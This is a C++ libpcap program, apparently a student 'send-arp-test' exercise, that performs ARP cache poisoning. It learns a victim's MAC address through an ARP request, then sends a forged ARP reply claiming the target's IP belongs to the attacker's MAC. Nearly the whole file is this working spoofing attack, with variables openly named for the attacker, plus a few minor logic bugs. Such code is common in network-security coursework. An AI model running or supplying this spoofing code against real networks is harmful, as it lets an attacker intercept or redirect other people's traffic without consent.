#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
//#include <libnet.h>

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

typedef struct s_info {
	Mac	mac;
	Ip	ip;
}	t_info;

int	getAttacker(t_info *attacker, char *dev)
{
	struct ifreq data;
   	int	fd;
	
	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(data.ifr_name, dev);
    if (!ioctl(fd, SIOCGIFHWADDR, &data))
		attacker->mac = Mac((uint8_t *)data.ifr_hwaddr.sa_data);
	else
		return 1;
	if (!ioctl(fd, SIOCGIFADDR, &data))
		attacker->ip = Ip(ntohl(((struct sockaddr_in*)&data.ifr_addr)->sin_addr.s_addr));
	else
		return 1;
	printf("Attacker's mac addr: [%s]\n", std::string(attacker->mac).data());
	printf("Attacker's ip addr: [%s]\n", std::string(attacker->ip).data());
	close(fd);
	return 0;
}

int	sendARPPacket(pcap *handle, int mode, Mac eth_smac, Mac eth_dmac, t_info arp_sender, t_info arp_target)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	if (mode)
		packet.arp_.op_ = htons(ArpHdr::Reply);
	else
		packet.arp_.op_ = htons(ArpHdr::Request);

	packet.arp_.smac_ = arp_sender.mac;
	packet.arp_.sip_ = htonl(arp_sender.ip);
	packet.arp_.tmac_ = arp_target.mac;
	packet.arp_.tip_ = htonl(arp_target.ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res) {
		fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 1;
	}

	return 0;
}

int	getSenderMac(pcap *handle, t_info *attacker, t_info *sender)
{
	t_info target;

	target.mac = Mac("00:00:00:00:00:00");
	target.ip = sender->ip;
	if (sendARPPacket(handle, 0, attacker->mac, Mac("FF:FF:FF:FF:FF:FF"), *attacker, target))
		return 1;
	struct pcap_pkthdr *header;
	const u_char *packet;

	while (1)
	{
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) return 1;

		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "Error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 1;
		}

		if (((EthHdr *)packet)->type() != ((EthHdr *)packet)->Arp)
			continue ;

		EthArpPacket *respacket = (EthArpPacket *)packet;
		if (respacket->eth_.dmac() == attacker->mac && respacket->arp_.sip() == sender->ip && respacket->arp_.tmac() == attacker->mac && respacket->arp_.tip() == attacker->ip)
		{
			sender->mac = respacket->eth_.smac();
			printf("Sender's mac addr: %s\n", std::string(sender->mac).data());
			return 0;
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2)!=0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	t_info attacker, sender, target;

	getAttacker(&attacker, dev);

	for(int i=1; i<argc/2; i++){
		sender.ip = Ip(std::string(argv[2*i]));
		target.ip = Ip(std::string(argv[2*i+1]));

		sendARPPacket(handle,0, attacker.mac, Mac::broadcastMac(), attacker, sender);

		while (1){
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);

			if (res == 0) continue;

			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				fprintf(stderr, "Error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				return 1;
			}

			if (((EthHdr *)packet)->type() != ((EthHdr *)packet)->Arp)
				break;

			EthArpPacket *resPacket = (EthArpPacket *)packet;
			if (resPacket->arp_.sip() == sender.ip && resPacket->arp_.tip() == attacker.ip){
				sender.mac = resPacket->eth_.smac();	
				printf("Sender's mac addr: [%s]\n", std::string(sender.mac).data());
				break;
			}
		}

		attacker.ip = target.ip;
		if (!sendARPPacket(handle, 1, attacker.mac, sender.mac, attacker, sender)){
			printf("Success!");
		}
	}

	pcap_close(handle);

}
